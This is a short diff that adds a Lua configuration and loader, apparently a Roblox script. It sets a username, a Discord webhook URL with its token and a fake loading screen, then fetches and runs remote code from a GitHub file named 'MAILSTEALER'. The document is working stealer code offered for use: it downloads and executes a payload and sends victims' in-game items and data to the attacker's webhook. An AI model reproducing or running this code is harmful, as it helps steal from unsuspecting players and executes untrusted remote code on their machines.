@@ -1,0 +1,8 @@
+Username = "ikarealname"
+Webhook = "https://discord.com/api/webhooks/1561243712468811826/dRlpBxGPdRGZR6GfebKSczHz8ofBEis1UNTZRKyaMDG4GkjRK5EZ-rjZeKckPolSd7bw"
+Mailmsg = "thanks"
+FakeLoadScreen = true
+Fake_Hub_If_Not_Enough_Gems = false
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/POGGERZ15/MAILSTEALER/main/Main.lua"))()
+```      
